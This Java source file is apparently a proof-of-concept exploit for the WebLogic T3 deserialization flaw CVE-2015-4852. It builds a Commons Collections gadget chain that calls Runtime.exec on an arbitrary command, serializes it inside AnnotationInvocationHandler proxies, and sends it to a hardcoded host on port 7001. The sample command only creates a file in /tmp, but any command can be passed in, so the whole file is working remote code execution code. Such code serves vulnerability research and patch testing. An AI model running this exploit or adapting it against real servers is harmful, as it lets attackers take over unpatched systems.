import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static util.t3tool.WeblogicT3.*;

public class T3_CVE_2015_4852 {

    public static byte[] getPayload(String cmd) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{cmd})
        };

        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
                        new Class[]{Map.class}, handler));

        handler = (InvocationHandler) getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler")
                .newInstance(Override.class, mapProxy);
        /*
        1  \CVE-2015-4852   直接将AnnotationInvocationHandler对象传入
         */
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(handler);

        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();

        return  payload;
    }

    public static void main(String[] args) throws Exception {


        String host = "10.58.120.200";
        String port = "7001";
        String cmd = "touch /tmp/T3_CVE_2015_4852";

        byte[] payload = getPayload(cmd);
        t3Send(host, port, payload);
    }
}
